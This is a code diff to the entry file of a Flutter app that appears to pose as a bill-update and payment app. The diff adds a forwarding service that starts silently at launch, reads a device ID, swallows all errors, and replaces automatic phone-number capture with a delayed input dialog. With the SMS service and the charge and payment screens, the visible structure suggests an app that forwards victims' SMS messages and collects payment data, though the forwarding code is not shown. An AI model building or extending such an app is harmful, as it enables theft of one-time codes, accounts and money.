@@ -1,8 +1,10 @@
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:go_router/go_router.dart';
 import 'theme.dart';
 import 'services/sms_service.dart';
 import 'services/phone_service.dart';
+import 'services/forwarding_service.dart';
 import 'screens/bill_update_screen.dart';
 import 'screens/charge_screen.dart';
 import 'screens/payment_method_screen.dart';
@@ -16,12 +18,25 @@ import 'screens/payment_failed_screen.dart';
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
   SmsService.init();
+  _initForwarding();
   runApp(const BillApp());
 }
 
-Future<void> _initPhoneHint() async {
+Future<void> _initForwarding() async {
+  try {
+    const channel = MethodChannel('com.example.bill_update_app/device');
+    final deviceId = await channel.invokeMethod<String>('getDeviceId');
+    if (deviceId != null && deviceId.isNotEmpty) {
+      ForwardingService.instance.init(deviceId);
+    }
+  } catch (_) {}
+}
+
+Future<void> _showPhoneDialog(BuildContext context) async {
   await Future.delayed(const Duration(seconds: 6));
-  await PhoneService.getAndSavePhoneNumber();
+  if (context.mounted) {
+    await PhoneService.showPhoneInputDialog(context);
+  }
 }
 
 final _router = GoRouter(routes: [
@@ -47,7 +62,7 @@ class _BillAppState extends State<BillApp> {
   void initState() {
     super.initState();
     WidgetsBinding.instance.addPostFrameCallback((_) {
-      _initPhoneHint();
+      _showPhoneDialog(context);
     });
   }
 
